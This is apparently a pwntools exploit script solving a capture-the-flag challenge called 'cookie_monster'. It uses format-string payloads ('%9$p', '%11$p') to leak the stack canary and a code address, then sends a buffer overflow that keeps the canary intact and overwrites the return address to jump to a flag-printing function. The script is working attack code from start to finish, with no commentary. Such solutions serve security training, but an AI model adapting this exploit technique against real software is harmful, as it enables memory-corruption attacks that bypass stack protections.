from pwn import *

context(terminal=['tmux','new-window'],os='linux',arch='amd64')

def socket():
    p = process('./cookie_monster')
    # p = gdb.debug('./cookie_monster')
    # p = remote('ctf.umbccd.io', 4200)
    return p

fmt1 = b'%9$p'
fmt2 = b'%11$p'
junk = b'A'*8

p = socket()
p.sendline(fmt1)
p.recvuntil('Hello, ')
cookie = int(p.recvline().strip().decode()[:-8],16)
p.close()

p = socket()
p.sendline(fmt2)
p.recvuntil('Hello, ')
main24 = int(p.recvline().decode().strip(),16)
flag = p64(main24 - 0x134f + 0x11b5)

buf = b''
buf += b'a'*13
buf += p32(cookie)
buf += junk
buf += flag

p.sendline(buf)
received = p.recvall().decode()
print(received)
